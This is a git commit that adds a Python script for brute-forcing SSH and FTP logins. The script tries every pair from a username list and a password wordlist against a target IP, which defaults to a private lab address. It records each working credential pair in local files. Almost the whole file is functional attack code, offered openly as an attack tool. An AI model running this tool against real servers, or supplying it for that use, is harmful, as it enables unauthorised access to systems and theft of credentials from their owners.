612a387a09110ca22aea1ffc75f679871ebd44ff
Ayly_EXE <80326459+Ayly-EXE@users.noreply.github.com>
2026-04-21 16:12:46 +0200

    Added ftp

---
+++ bruteforce.py
@@ -0,0 +1,90 @@
+import ftplib
+import paramiko
+import argparse
+import socket
+
+
+def ssh_brute_force(ip, port, user, passwd):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        client.connect(hostname=ip, port=port, username=user, password=passwd, timeout=3)
+    except paramiko.AuthenticationException:
+        print("Authentication failed")
+    except socket.timeout:
+        print("Timeout error")
+    except paramiko.SSHException:
+        print("SSH connection error")
+    else:
+        print(f"Password found: {user}:{passwd}")
+        with open("ssh_found", 'a') as f_found:
+            f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
+            f_found.flush()
+    finally:
+        client.close()
+
+def ftp_brute_force(ip, port, user, passwd):
+    server = ftplib.FTP()
+    try:
+        server.connect(ip, port, timeout=3)
+        server.login(user, passwd)
+
+    except ftplib.error_perm:
+        print("Authentication failed")
+    except socket.timeout:
+        print("Timeout error")
+    except ConnectionRefusedError:
+        print("Connection refused")
+    else:
+        print(f"Password found: {user}:{passwd}")
+        with open("ftp_found", 'a') as f_found:
+            f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
+            f_found.flush()
+    finally:
+        server.close()  # ✅ always close the connection
+
+if __name__ == "__main__":
+    arg_parser = argparse.ArgumentParser()
+
+    arg_parser.add_argument("-f", "--filepath", help="path to the pass list")
+    arg_parser.add_argument("-t", "--target", help="target ip")
+    arg_parser.add_argument("-p", "--protocol", help="protocol to use for the attack", required=True)
+    args = arg_parser.parse_args()
+
+    userlist = "userlist.txt"
+    passlist = "password.txt"
+    target = "192.168.2.6"
+
+    if args.filepath:
+        passlist = args.filepath
+
+    if args.target:
+        target = args.target
+
+    with open(userlist, 'r') as user_list:
+        for u_line in user_list:
+            username = u_line.strip()
+            with open(passlist, 'r') as f:
+                for p_line in f:
+                    password = p_line.strip()
+
+                    if args.protocol == "ssh":
+                        ssh_brute_force(ip=target, port=22, user=username, passwd=password)
+                    elif args.protocol == "ftp":
+                        ftp_brute_force(ip=target, port=21, user=username, passwd=password)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
